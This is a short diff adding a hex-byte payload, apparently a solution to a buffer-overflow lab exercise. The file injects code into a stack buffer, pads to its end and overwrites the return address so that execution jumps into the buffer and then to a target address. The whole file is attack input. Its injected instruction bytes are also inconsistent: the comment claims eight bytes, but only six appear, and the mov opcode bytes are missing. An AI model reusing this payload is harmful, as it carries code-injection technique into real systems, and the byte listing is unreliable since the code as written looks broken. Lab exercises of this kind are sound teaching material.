@@ -1,0 +1,7 @@
+/* start of injected code */
+48 f5 df 52 3e c3 /* mov param to %rdi and retq = 8 bytes */
+00 00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 /* bytes so far (end of buf) */
+/* make address point to start of injected code (address of buf) */
+28 9f 62 55 00 00 00 00
+6b 18 40 00 00 00 00 00 
